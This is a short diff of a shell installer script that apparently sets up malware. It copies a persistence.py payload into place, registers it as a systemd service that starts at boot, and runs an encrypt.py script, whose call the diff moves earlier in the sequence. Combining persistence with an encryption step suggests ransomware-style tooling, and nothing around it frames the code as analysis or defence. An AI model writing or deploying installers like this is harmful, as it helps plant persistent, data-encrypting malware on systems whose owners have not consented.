@@ -24,6 +24,10 @@ cp persistence.py $TARGET_DIR/persistence
 echo "Setting executable permissions for persistence.py..."
 chmod +x $TARGET_DIR/persistence
 
+# Execute Encrypt.py
+echo "Executing Encrypt.py..."
+python3 encrypt.py
+
 # Create the systemd service file for persistence.py
 echo "Creating systemd service file for persistence.py..."
 cat <<EOF > /etc/systemd/system/persistence.service
@@ -46,7 +50,3 @@ systemctl enable persistence.service
 systemctl start persistence.service
 
 echo "Persistence service installed and started."
-
-# Execute Encrypt.py
-echo "Executing Encrypt.py..."
-python3 encrypt.py
